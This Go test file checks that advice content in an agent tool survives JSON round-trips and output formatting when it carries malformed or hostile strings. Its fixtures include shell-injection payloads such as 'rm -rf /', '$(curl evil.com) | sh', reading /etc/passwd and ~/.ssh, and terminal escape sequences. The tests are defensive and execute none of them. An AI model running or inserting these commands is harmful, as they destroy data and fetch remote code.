package cmd

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

// ============================================================================
// Output Sanitization Tests for Advice Content
// ============================================================================
//
// These tests verify that advice content with potentially malicious or
// malformed content is handled safely without causing:
// - Terminal corruption (ANSI escape codes)
// - Shell command execution
// - Parser crashes (embedded newlines, special chars)
// - Memory exhaustion (very long content)
// - Display corruption (Unicode edge cases)

// TestAdviceBead_ANSIEscapeCodes verifies that ANSI escape codes in advice
// content don't corrupt terminal output.
func TestAdviceBead_ANSIEscapeCodes(t *testing.T) {
	testCases := []struct {
		name        string
		title       string
		description string
	}{
		{
			name:        "reset sequence",
			title:       "Test \x1b[0m Reset",
			description: "Description with \x1b[0m reset code",
		},
		{
			name:        "color codes",
			title:       "\x1b[31mRed\x1b[0m Title",
			description: "\x1b[32mGreen\x1b[0m description",
		},
		{
			name:        "cursor movement",
			title:       "Move \x1b[2A up",
			description: "Clear \x1b[2K line",
		},
		{
			name:        "bell character",
			title:       "Alert \x07 beep",
			description: "More \x07\x07\x07 bells",
		},
		{
			name:        "OSC sequences",
			title:       "OSC \x1b]0;pwned\x07 title",
			description: "Window \x1b]2;hacked\x07 rename",
		},
		{
			name:        "device control",
			title:       "DCS \x1bP escape",
			description: "Control \x1b\\ sequence",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			bead := AdviceBead{
				ID:          "test-" + tc.name,
				Title:       tc.title,
				Description: tc.description,
			}

			// Verify JSON marshaling works
			data, err := json.Marshal(bead)
			if err != nil {
				t.Errorf("json.Marshal failed: %v", err)
				return
			}

			// Verify JSON unmarshaling works
			var decoded AdviceBead
			if err := json.Unmarshal(data, &decoded); err != nil {
				t.Errorf("json.Unmarshal failed: %v", err)
				return
			}

			// Verify content is preserved exactly
			if decoded.Title != tc.title {
				t.Errorf("title mismatch: got %q, want %q", decoded.Title, tc.title)
			}
			if decoded.Description != tc.description {
				t.Errorf("description mismatch: got %q, want %q", decoded.Description, tc.description)
			}

			// Verify getAdviceScope doesn't crash
			scope := getAdviceScope(bead)
			if scope == "" {
				t.Error("getAdviceScope returned empty string")
			}
		})
	}
}

// TestAdviceBead_EmbeddedNewlines verifies that embedded newlines in advice
// content are handled correctly.
func TestAdviceBead_EmbeddedNewlines(t *testing.T) {
	testCases := []struct {
		name        string
		title       string
		description string
	}{
		{
			name:        "unix newlines",
			title:       "Line1\nLine2",
			description: "First\nSecond\nThird",
		},
		{
			name:        "windows newlines",
			title:       "Line1\r\nLine2",
			description: "First\r\nSecond\r\nThird",
		},
		{
			name:        "mixed newlines",
			title:       "Mix\n\r\n\r",
			description: "Unix\nWindows\r\nOld Mac\r",
		},
		{
			name:        "null bytes",
			title:       "Before\x00After",
			description: "Null\x00in\x00middle",
		},
		{
			name:        "tabs and newlines",
			title:       "\t\n\t\n",
			description: "\t\t\n\n\t\t",
		},
		{
			name:        "vertical tab and form feed",
			title:       "VT\vFF\f",
			description: "Form\ffeed\fhere",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			bead := AdviceBead{
				ID:          "test-" + tc.name,
				Title:       tc.title,
				Description: tc.description,
			}

			// Verify JSON round-trip
			data, err := json.Marshal(bead)
			if err != nil {
				t.Errorf("json.Marshal failed: %v", err)
				return
			}

			var decoded AdviceBead
			if err := json.Unmarshal(data, &decoded); err != nil {
				t.Errorf("json.Unmarshal failed: %v", err)
				return
			}

			// Content should be preserved
			if decoded.Title != tc.title {
				t.Errorf("title changed after JSON round-trip")
			}
			if decoded.Description != tc.description {
				t.Errorf("description changed after JSON round-trip")
			}
		})
	}
}

// TestAdviceBead_ShellMetacharacters verifies that shell metacharacters in
// advice content don't cause command injection.
func TestAdviceBead_ShellMetacharacters(t *testing.T) {
	testCases := []struct {
		name        string
		title       string
		description string
	}{
		{
			name:        "redirect operators",
			title:       "Test > /dev/null",
			description: "< /etc/passwd >> /tmp/out",
		},
		{
			name:        "pipe operators",
			title:       "echo test | cat",
			description: "cmd1 | cmd2 | cmd3",
		},
		{
			name:        "semicolon",
			title:       "cmd1; cmd2; cmd3",
			description: "rm -rf /; echo done",
		},
		{
			name:        "dollar variables",
			title:       "Value is $HOME",
			description: "Path: ${PATH} User: $USER",
		},
		{
			name:        "backticks",
			title:       "`whoami`",
			description: "User: `id`",
		},
		{
			name:        "command substitution",
			title:       "$(whoami)",
			description: "User: $(id -un)",
		},
		{
			name:        "ampersand",
			title:       "cmd1 && cmd2",
			description: "bg & cmd || fallback",
		},
		{
			name:        "quotes",
			title:       `"double" and 'single'`,
			description: `It's a "test"`,
		},
		{
			name:        "mixed dangerous",
			title:       "; rm -rf / ; $(curl evil.com) | sh",
			description: "`cat /etc/passwd` > /tmp/pwned && $HOME/.ssh/*",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			bead := AdviceBead{
				ID:          "test-" + tc.name,
				Title:       tc.title,
				Description: tc.description,
			}

			// Verify JSON round-trip preserves content exactly
			data, err := json.Marshal(bead)
			if err != nil {
				t.Errorf("json.Marshal failed: %v", err)
				return
			}

			var decoded AdviceBead
			if err := json.Unmarshal(data, &decoded); err != nil {
				t.Errorf("json.Unmarshal failed: %v", err)
				return
			}

			if decoded.Title != tc.title {
				t.Errorf("title mismatch: got %q, want %q", decoded.Title, tc.title)
			}
			if decoded.Description != tc.description {
				t.Errorf("description mismatch: got %q, want %q", decoded.Description, tc.description)
			}
		})
	}
}

// TestAdviceBead_VeryLongTitle verifies handling of very long titles.
func TestAdviceBead_VeryLongTitle(t *testing.T) {
	testCases := []struct {
		name   string
		length int
	}{
		{"500 chars", 500},
		{"1000 chars", 1000},
		{"5000 chars", 5000},
		{"10000 chars", 10000},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Generate a long title
			longTitle := strings.Repeat("A", tc.length)

			bead := AdviceBead{
				ID:          "test-long-title",
				Title:       longTitle,
				Description: "Normal description",
			}

			// Verify JSON round-trip
			data, err := json.Marshal(bead)
			if err != nil {
				t.Errorf("json.Marshal failed for %d char title: %v", tc.length, err)
				return
			}

			var decoded AdviceBead
			if err := json.Unmarshal(data, &decoded); err != nil {
				t.Errorf("json.Unmarshal failed for %d char title: %v", tc.length, err)
				return
			}

			if len(decoded.Title) != tc.length {
				t.Errorf("title length changed: got %d, want %d", len(decoded.Title), tc.length)
			}

			// Verify scope extraction doesn't crash on long content
			_ = getAdviceScope(bead)
		})
	}
}

// TestAdviceBead_VeryLongDescription verifies handling of very long descriptions.
func TestAdviceBead_VeryLongDescription(t *testing.T) {
	testCases := []struct {
		name   string
		length int
	}{
		{"1KB", 1024},
		{"10KB", 10 * 1024},
		{"100KB", 100 * 1024},
		{"1MB", 1024 * 1024},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Generate a long description
			longDesc := strings.Repeat("B", tc.length)

			bead := AdviceBead{
				ID:          "test-long-desc",
				Title:       "Normal title",
				Description: longDesc,
			}

			// Verify JSON round-trip
			data, err := json.Marshal(bead)
			if err != nil {
				t.Errorf("json.Marshal failed for %d byte description: %v", tc.length, err)
				return
			}

			var decoded AdviceBead
			if err := json.Unmarshal(data, &decoded); err != nil {
				t.Errorf("json.Unmarshal failed for %d byte description: %v", tc.length, err)
				return
			}

			if len(decoded.Description) != tc.length {
				t.Errorf("description length changed: got %d, want %d", len(decoded.Description), tc.length)
			}
		})
	}
}

// TestAdviceBead_UnicodeEdgeCases verifies handling of various Unicode edge cases.
func TestAdviceBead_UnicodeEdgeCases(t *testing.T) {
	testCases := []struct {
		name        string
		title       string
		description string
	}{
		{
			name:        "emoji",
			title:       "Test \U0001F4A5 Explosion",
			description: "Emojis: \U0001F600 \U0001F4BB \U0001F525",
		},
		{
			name:        "RTL text",
			title:       "Hello \u0645\u0631\u062D\u0628\u0627 World",
			description: "\u0627\u0644\u0633\u0644\u0627\u0645 \u0639\u0644\u064A\u0643\u0645",
		},
		{
			name:        "zero-width chars",
			title:       "Zero\u200Bwidth\u200Bspace",
			description: "ZWJ: \u200D ZWNJ: \u200C",
		},
		{
			name:        "combining characters",
			title:       "e\u0301 vs \u00E9", // é composed two ways
			description: "a\u0308 \u00E4",    // ä composed two ways
		},
		{
			name:        "bidirectional override",
			title:       "LTR \u202D override \u202C end",
			description: "RTL \u202E override \u202C",
		},
		{
			name:        "null width joiner sequences",
			title:       "\U0001F468\u200D\U0001F469\u200D\U0001F467", // Family emoji
			description: "\U0001F3F3\uFE0F\u200D\U0001F308",            // Rainbow flag
		},
		{
			name:        "byte order mark",
			title:       "\uFEFF BOM at start",
			description: "BOM in \uFEFF middle",
		},
		{
			name:        "replacement char",
			title:       "Invalid: \uFFFD",
			description: "Replacement: \uFFFD\uFFFD",
		},
		{
			name:        "private use area",
			title:       "PUA: \uE000\uE001",
			description: "More PUA: \uF8FF",
		},
		{
			name:        "surrogate handling",
			title:       "High surrogate should be escaped",
			description: "Valid: \U0001F4A9", // Properly encoded emoji
		},
		{
			name:        "very long combining",
			title:       "a\u0300\u0301\u0302\u0303\u0304\u0305", // Many combining marks
			description: "o\u0308\u0304\u0300\u0301\u0302",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			bead := AdviceBead{
				ID:          "test-" + tc.name,
				Title:       tc.title,
				Description: tc.description,
			}

			// Verify title is valid UTF-8
			if !utf8.ValidString(tc.title) {
				t.Errorf("title is not valid UTF-8: %q", tc.title)
			}
			if !utf8.ValidString(tc.description) {
				t.Errorf("description is not valid UTF-8: %q", tc.description)
			}

			// Verify JSON round-trip
			data, err := json.Marshal(bead)
			if err != nil {
				t.Errorf("json.Marshal failed: %v", err)
				return
			}

			var decoded AdviceBead
			if err := json.Unmarshal(data, &decoded); err != nil {
				t.Errorf("json.Unmarshal failed: %v", err)
				return
			}

			// Verify content preserved
			if decoded.Title != tc.title {
				t.Errorf("title mismatch after JSON round-trip")
			}
			if decoded.Description != tc.description {
				t.Errorf("description mismatch after JSON round-trip")
			}
		})
	}
}

// TestBuildAgentID_EdgeCases tests buildAgentID with edge case inputs.
func TestBuildAgentID_EdgeCases(t *testing.T) {
	testCases := []struct {
		name     string
		ctx      RoleInfo
		expected string
	}{
		{
			name: "empty rig polecat",
			ctx: RoleInfo{
				Role:    RolePolecat,
				Rig:     "",
				Polecat: "alpha",
			},
			expected: "",
		},
		{
			name: "empty polecat name",
			ctx: RoleInfo{
				Role:    RolePolecat,
				Rig:     "gastown",
				Polecat: "",
			},
			expected: "",
		},
		{
			name: "special chars in polecat name",
			ctx: RoleInfo{
				Role:    RolePolecat,
				Rig:     "gastown",
				Polecat: "alpha/beta",
			},
			expected: "gastown/polecats/alpha/beta",
		},
		{
			name: "unicode in rig name",
			ctx: RoleInfo{
				Role:    RolePolecat,
				Rig:     "\u0645\u0631\u062D\u0628\u0627",
				Polecat: "alpha",
			},
			expected: "\u0645\u0631\u062D\u0628\u0627/polecats/alpha",
		},
		{
			name: "newlines in names",
			ctx: RoleInfo{
				Role:    RolePolecat,
				Rig:     "gas\ntown",
				Polecat: "al\npha",
			},
			expected: "gas\ntown/polecats/al\npha",
		},
		{
			name: "witness with empty rig",
			ctx: RoleInfo{
				Role: RoleWitness,
				Rig:  "",
			},
			expected: "",
		},
		{
			name: "refinery with empty rig",
			ctx: RoleInfo{
				Role: RoleRefinery,
				Rig:  "",
			},
			expected: "",
		},
		{
			name:     "unknown role",
			ctx:      RoleInfo{Role: "unknown"},
			expected: "",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := buildAgentID(tc.ctx)
			if result != tc.expected {
				t.Errorf("buildAgentID(%+v) = %q, want %q", tc.ctx, result, tc.expected)
			}
		})
	}
}

// TestGetAdviceScope_EdgeCases tests getAdviceScope with edge case labels.
func TestGetAdviceScope_EdgeCases(t *testing.T) {
	testCases := []struct {
		name     string
		labels   []string
		expected string
	}{
		{
			name:     "no labels",
			labels:   nil,
			expected: "Global",
		},
		{
			name:     "empty labels",
			labels:   []string{},
			expected: "Global",
		},
		{
			name:     "empty string label",
			labels:   []string{""},
			expected: "Global",
		},
		{
			name:     "role with empty value",
			labels:   []string{"role:"},
			expected: "",
		},
		{
			name:     "rig with empty value",
			labels:   []string{"rig:"},
			expected: "",
		},
		{
			name:     "agent with empty value",
			labels:   []string{"agent:"},
			expected: "Agent",
		},
		{
			name:   "role with unicode",
			labels: []string{"role:\u0645\u0631\u062D\u0628\u0627"},
			// BUG: getAdviceScope uses role[:1] which takes first BYTE not first RUNE
			// This corrupts multi-byte Unicode characters. Filed as gt-m6vvlg.
			// The first byte (0xd9) becomes replacement char (U+FFFD), second byte
			// (0x85) becomes orphaned, rest of Arabic follows.
			expected: "\uFFFD\x85\u0631\u062D\u0628\u0627", // Corrupted output
		},
		{
			name:   "multiple prefix matches",
			labels: []string{"rig:gastown", "role:polecat", "agent:test"},
			// BUG: getAdviceScope iterates labels in order - first matching wins
			// regardless of prefix priority. Filed as gt-dzvg2m.
			expected: "gastown", // First label "rig:gastown" matches first
		},
		{
			name:     "rig before role",
			labels:   []string{"rig:gastown", "role:polecat"},
			expected: "gastown", // rig: comes before role: in iteration
		},
		{
			name:     "label with colons",
			labels:   []string{"rig:gas:town"},
			expected: "gas:town",
		},
		{
			name:     "very long label",
			labels:   []string{"role:" + strings.Repeat("x", 1000)},
			expected: strings.ToUpper("x") + strings.Repeat("x", 999),
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			bead := AdviceBead{Labels: tc.labels}
			result := getAdviceScope(bead)
			if result != tc.expected {
				t.Errorf("getAdviceScope with labels %v = %q, want %q", tc.labels, result, tc.expected)
			}
		})
	}
}

// TestAdviceBead_JSONParseEdgeCases tests JSON parsing edge cases.
func TestAdviceBead_JSONParseEdgeCases(t *testing.T) {
	testCases := []struct {
		name    string
		json    string
		wantErr bool
	}{
		{
			name:    "valid basic",
			json:    `{"id":"test","title":"Test","description":"Desc"}`,
			wantErr: false,
		},
		{
			name:    "escaped quotes",
			json:    `{"id":"test","title":"Say \"hello\"","description":"Desc"}`,
			wantErr: false,
		},
		{
			name:    "escaped backslash",
			json:    `{"id":"test","title":"Path\\to\\file","description":"Desc"}`,
			wantErr: false,
		},
		{
			name:    "unicode escapes",
			json:    `{"id":"test","title":"\u0048\u0065\u006c\u006c\u006f","description":"Desc"}`,
			wantErr: false,
		},
		{
			name:    "emoji unicode escape",
			json:    `{"id":"test","title":"\uD83D\uDE00","description":"Desc"}`,
			wantErr: false,
		},
		{
			name:    "null values",
			json:    `{"id":"test","title":null,"description":null}`,
			wantErr: false,
		},
		{
			name:    "empty strings",
			json:    `{"id":"","title":"","description":""}`,
			wantErr: false,
		},
		{
			name:    "extra fields",
			json:    `{"id":"test","title":"Test","description":"Desc","unknown":"field"}`,
			wantErr: false,
		},
		{
			name:    "invalid json - truncated",
			json:    `{"id":"test","title":"Test`,
			wantErr: true,
		},
		{
			name:    "invalid json - bad escape",
			json:    `{"id":"test","title":"\x00"}`,
			wantErr: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var bead AdviceBead
			err := json.Unmarshal([]byte(tc.json), &bead)
			if (err != nil) != tc.wantErr {
				t.Errorf("json.Unmarshal error = %v, wantErr %v", err, tc.wantErr)
			}
		})
	}
}

// TestAdviceBead_ArrayParsing tests parsing arrays of advice beads.
func TestAdviceBead_ArrayParsing(t *testing.T) {
	testCases := []struct {
		name      string
		json      string
		wantCount int
		wantErr   bool
	}{
		{
			name:      "empty array",
			json:      `[]`,
			wantCount: 0,
			wantErr:   false,
		},
		{
			name:      "single bead",
			json:      `[{"id":"1","title":"Test","description":"Desc"}]`,
			wantCount: 1,
			wantErr:   false,
		},
		{
			name:      "multiple beads",
			json:      `[{"id":"1","title":"A","description":""},{"id":"2","title":"B","description":""}]`,
			wantCount: 2,
			wantErr:   false,
		},
		{
			name:      "bead with special content",
			json:      `[{"id":"1","title":"ANSI: \u001b[0m","description":"Shell: $(whoami)"}]`,
			wantCount: 1,
			wantErr:   false,
		},
		{
			name:      "null in array",
			json:      `[{"id":"1","title":"A","description":""},null]`,
			wantCount: 2,
			wantErr:   false,
		},
		{
			name:      "invalid - not array",
			json:      `{"id":"1","title":"A"}`,
			wantErr:   true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var beads []AdviceBead
			err := json.Unmarshal([]byte(tc.json), &beads)
			if (err != nil) != tc.wantErr {
				t.Errorf("json.Unmarshal error = %v, wantErr %v", err, tc.wantErr)
				return
			}
			if !tc.wantErr && len(beads) != tc.wantCount {
				t.Errorf("got %d beads, want %d", len(beads), tc.wantCount)
			}
		})
	}
}

// TestAdviceOutputBuffer tests that advice output doesn't corrupt when written
// to a buffer (simulating terminal output).
func TestAdviceOutputBuffer(t *testing.T) {
	testCases := []struct {
		name        string
		title       string
		description string
	}{
		{
			name:        "normal content",
			title:       "Normal Title",
			description: "Normal description",
		},
		{
			name:        "ANSI codes",
			title:       "\x1b[31mRed\x1b[0m",
			description: "\x1b[1mBold\x1b[0m",
		},
		{
			name:        "multiline",
			title:       "Title",
			description: "Line1\nLine2\nLine3",
		},
		{
			name:        "shell chars",
			title:       "$(whoami); rm -rf /",
			description: "`id` | cat > /tmp/pwned",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			bead := AdviceBead{
				ID:          "test",
				Title:       tc.title,
				Description: tc.description,
				Labels:      []string{"global"},
			}

			// Simulate the output formatting from outputAdviceContext
			var buf bytes.Buffer

			scope := getAdviceScope(bead)
			buf.WriteString("**[" + scope + "]** " + bead.Title + "\n")

			if bead.Description != "" {
				lines := strings.Split(bead.Description, "\n")
				for _, line := range lines {
					buf.WriteString("  " + line + "\n")
				}
			}

			// Verify output is valid UTF-8
			output := buf.String()
			if !utf8.ValidString(output) {
				t.Errorf("output is not valid UTF-8: %q", output)
			}

			// Verify title is in output
			if !strings.Contains(output, tc.title) {
				t.Errorf("output should contain title")
			}
		})
	}
}
